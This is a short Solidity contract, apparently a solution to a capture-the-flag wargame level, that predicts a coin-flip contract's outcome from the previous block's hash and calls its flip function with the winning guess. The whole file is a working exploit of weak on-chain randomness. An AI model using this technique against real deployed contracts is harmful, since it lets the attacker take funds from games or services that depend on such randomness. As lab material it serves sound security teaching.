//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract CoinFlipInstance {
  function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipHack {
    CoinFlipInstance cfi;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _cfi) {
        //pass instance address to interact with it
        cfi = CoinFlipInstance(_cfi);
    }

    function flipCoin() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return cfi.flip(side);
    }

}
